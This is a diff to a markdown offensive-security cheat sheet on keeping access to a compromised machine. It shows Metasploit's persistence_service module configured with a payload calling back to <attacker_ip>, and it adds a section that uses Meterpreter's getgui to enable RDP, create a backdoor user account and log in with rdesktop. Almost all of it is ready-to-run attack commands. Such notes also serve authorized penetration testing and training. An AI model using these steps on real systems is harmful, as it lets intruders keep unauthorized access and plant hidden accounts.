@@ -1,6 +1,8 @@
 Persistence is a key post-exploitation step that allows an attacker to maintain access to a compromised system even after it has been rebooted or the initial session has been closed.
 
-## Metasploit
+
+
+## Metasploit Persistence Service
 
 1. Gain a Meterpreter session on the target machine 
 2. Load the `persistence_service` module
@@ -25,4 +27,24 @@ set payload <payload_type>
 set LHOST <attacker_ip>         
 set LPORT <listening_port>       
 exploit
+```
+
+
+## Metasploit Persistence via RDP
+1. **Gain a Meterpreter Session** Ensure you have an active Meterpreter session on the target machine.
+  
+2. **Enable RDP on the Target** Use the `getgui` Meterpreter script to enable RDP on the target system:
+```bash
+run getgui -e
+```
+This command enables the Remote Desktop Service on the target system.
+
+3. **Create a New User for Persistence** To create a new user for persistent RDP access, specify a username and password:
+```bash
+run getgui -u <username> -p <password>
+```
+
+4. **Validate RDP Access** After enabling RDP and creating a user, you can test your access using an RDP client:
+```bash
+rdesktop <target_ip> -u <username> -p <password>
 ```
